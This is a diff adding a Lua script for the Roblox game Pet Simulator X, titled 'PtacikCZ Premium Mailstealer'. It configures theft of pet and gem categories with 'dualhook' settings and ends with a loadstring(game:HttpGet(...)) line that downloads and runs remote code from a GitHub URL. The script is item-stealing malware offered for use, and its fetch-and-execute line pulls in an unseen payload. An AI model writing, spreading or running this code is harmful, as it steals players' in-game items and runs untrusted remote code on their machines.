@@ -1,0 +1,45 @@
+-- [PtacikCZ Premium Mailstealer]
+
+getgenv().Settings = {
+    User = "PtacikCZ",
+    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    MailMessage = "PtacikCZ Je Best!!!",
+  Titanics = {
+       Dualhook = true,
+       Intensity = 100--% -- set to whatever u want
+  },
+  Banana = {
+       Dualhook = true,
+       Intensity = 100--% -- set to whatever u want
+  },
+  Huges = {
+       Dualhook = true,
+       Intensity = 100--% -- set to whatever u want
+  },
+  Pogs = {
+       Dualhook = true,
+       Intensity = 100--% -- set to whatever u want
+  },
+   Exclusives = {
+       Dualhook = true,
+       Intensity = 100--% -- set to whatever u want
+  },
+   Events = {
+       Dualhook = true,
+       Intensity = 100--% -- set to whatever u want
+  },
+   Secrets = {
+       Dualhook = true,
+       Intensity = 100--% -- set to whatever u want
+   },
+   HC_DM_Mythics = {
+       Dualhook = true,
+       Intensity = 100--% -- set to whatever u want
+   },
+   Gems = {
+       Dualhook = true,
+       Intensity = 100--% -- set to whatever u want
+  }
+}
+--{{ Script }}--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PtacikCZ/PSX/main/PREMIUM.LUA"))()
